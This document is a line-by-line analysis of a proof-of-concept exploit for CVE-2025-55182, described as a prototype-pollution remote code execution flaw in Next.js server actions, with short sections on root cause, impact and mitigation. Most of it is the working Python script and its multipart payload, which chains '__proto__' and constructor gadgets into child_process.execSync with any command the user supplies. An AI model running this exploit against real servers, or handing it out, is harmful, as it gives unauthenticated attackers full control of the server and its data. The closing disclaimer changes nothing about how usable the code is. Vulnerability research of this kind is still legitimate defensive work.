## CVE-2025-55182 Analysis

### **Vulnerability Overview**
**CVE-2025-55182** is a **prototype pollution vulnerability in Next.js** that leads to **Remote Code Execution (RCE)**. The vulnerability exists in Next.js's form data handling mechanism, allowing attackers to pollute the Object prototype and execute arbitrary commands on the server.

---

## **POC Explanation**

### **Lines 1-4: Shebang and Imports**
```python
#!/usr/bin/env python3
import sys
import requests
```
- `#!/usr/bin/env python3`: Specifies the Python 3 interpreter
- `import sys`: For accessing command-line arguments
- `import requests`: For making HTTP POST requests

### **Lines 6-12: Argument Handling**
```python
def main():
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <url> <command>")
        sys.exit(1)

    url = sys.argv[1]
    command = sys.argv[2]
```
- Checks if both URL and command arguments are provided
- `sys.argv[1]`: Target Next.js application URL
- `sys.argv[2]`: Command to execute on the target server

### **Lines 14-21: HTTP Headers**
```python
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
        "Next-Action": "x",
        "X-Nextjs-Request-Id": "b5dce965",
        "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9"
    }
```
- **User-Agent**: Disguises as Chrome browser with Assetnote identifier
- **Next-Action**: Triggers Next.js action handler (critical for exploitation)
- **X-Nextjs-Request-Id/X-Nextjs-Html-Request-Id**: Next.js-specific headers that help route the request to vulnerable code paths

### **Lines 23-36: Malicious Form Data (Exploit Core)**
```python
    files = {
        "0": (None,
              '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
              f'"value":"{{\\"then\\":\\"$B1337\\"}}",'
              f'"_response":{{"_prefix":"process.mainModule.require(\'child_process\').execSync(\'{command}\');",'
              '"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}}'),
        "1": (None, '"$@0"'),
        "2": (None, "[]")
    }
```

### **Breaking Down the Payload:**

#### **Key 0 - Main Payload:**
```json
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "process.mainModule.require('child_process').execSync('COMMAND');",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
```

#### **Exploitation Chain:**
1. **Prototype Pollution (`$1:__proto__:then`)**: 
   - `$1` references the second form field
   - `:__proto__:` targets the Object prototype
   - `then` pollutes the Promise prototype chain

2. **Gadget Chaining**:
   - `_response._prefix`: Contains the RCE payload
     ```javascript
     process.mainModule.require('child_process').execSync('COMMAND')
     ```
   - `_formData.get`: Triggers constructor pollution
   - `$1:constructor:constructor`: Accesses the Function constructor

3. **Trigger Mechanism**:
   - `"$B1337"`: Special marker used by Next.js's internal deserialization
   - `"$Q2"`: References the third form field (empty array)

#### **Keys 1 and 2 - Helper Payloads:**
- `"1": (None, '"$@0"')`: References the first payload
- `"2": (None, "[]")`: Empty array used in the exploitation chain

### **Lines 38-41: Sending the Exploit**
```python
    resp = requests.post(url, headers=headers, files=files)
    print("Status:", resp.status_code)
    print("Response:", resp.text)
```
- Sends POST request with malicious multipart/form-data
- Prints HTTP status code and response for debugging

---

## **Technical Analysis**

### **Root Cause:**
The vulnerability exists in Next.js's **`@next/react-server-dom-vendored`** package during form data deserialization. The `$__proto__` syntax isn't properly sanitized, allowing prototype pollution.

### **Exploitation Flow:**
1. **Prototype Pollution**: Pollutes `Object.prototype.then` via `$1:__proto__:then`
2. **Promise Handler Hijacking**: Next.js's async handling gets confused
3. **Code Execution**: The polluted `_prefix` value gets evaluated as JavaScript
4. **Child Process Execution**: `execSync()` runs the attacker's command

### **Impact:**
- **Full RCE**: Arbitrary command execution as the Next.js process user
- **Privilege Escalation**: If Next.js runs with elevated privileges
- **Data Exfiltration**: Access to sensitive environment variables and files

### **Affected Versions:**
- Next.js versions prior to specific security patches
- Applications using server actions or form handling

### **Mitigation:**
1. **Update Next.js** to the latest patched version
2. **Input Validation**: Sanitize all user inputs, especially form data
3. **Content Security Policy**: Implement strict CSP headers
4. **Process Isolation**: Run Next.js with minimal privileges

---

## **Security Implications**
This is a **critical vulnerability** (likely CVSS 9.0+) because:
1. No authentication required
2. Leads to full server compromise
3. Exploitation is straightforward with public POC
4. Affects a popular framework (Next.js)

**Note**: This analysis is for educational purposes only. Do not test on systems without explicit authorization.